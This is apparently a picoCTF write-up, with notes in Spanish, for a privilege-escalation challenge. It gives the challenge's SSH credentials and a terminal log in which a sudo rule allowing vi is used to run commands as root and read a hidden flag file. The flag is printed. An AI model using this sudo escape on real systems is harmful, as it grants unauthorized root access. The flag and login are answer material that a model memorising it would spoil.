#### Description

Can you read files in the root file? 
The system admin has provisioned an account for you on the main server: 
`ssh -p 49927 picoplayer@saturn.picoctf.net` 
Password: `j4ks-9nxB-` 
Can you login and read the root file?

**Solución**

```

Fercho@MSI:/mnt/c/Users/ferga$ ssh -p 49927 picoplayer@saturn.picoctf.net
picoplayer@saturn.picoctf.net's password:
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.8.0-1044-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Thu Feb 19 03:57:47 2026 from 187.133.231.241
picoplayer@challenge:~$ ls /
bin   challenge  etc   lib    lib64   media  opt   root  sbin  sys  usr
boot  dev        home  lib32  libx32  mnt    proc  run   srv   tmp  var
picoplayer@challenge:~$ ls root
ls: cannot access 'root': No such file or directory
picoplayer@challenge:~$ ls /root
ls: cannot open directory '/root': Permission denied
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer:
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:~$ sudo vi

ls: cannot access 'root': No such file or directory

shell returned 2

Press ENTER or type command to continue
total 12
drwx------ 1 root root   23 Aug  4  2023 .
drwxr-xr-x 1 root root   51 Feb 19 04:15 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile

Press ENTER or type command to continue
picoCTF{uS1ng_v1m_3dit0r_021d10ab}

Press ENTER or type command to continueConnection to saturn.picoctf.net closed by remote host.
Connection to saturn.picoctf.net closed.

```


**Notas adicionales** 

- Se conecto al servidor y como no se tenían permisos se busco por otra parte de la ruta mediante sudo

**Referencias**

https://gtfobins.org/gtfobins/vi/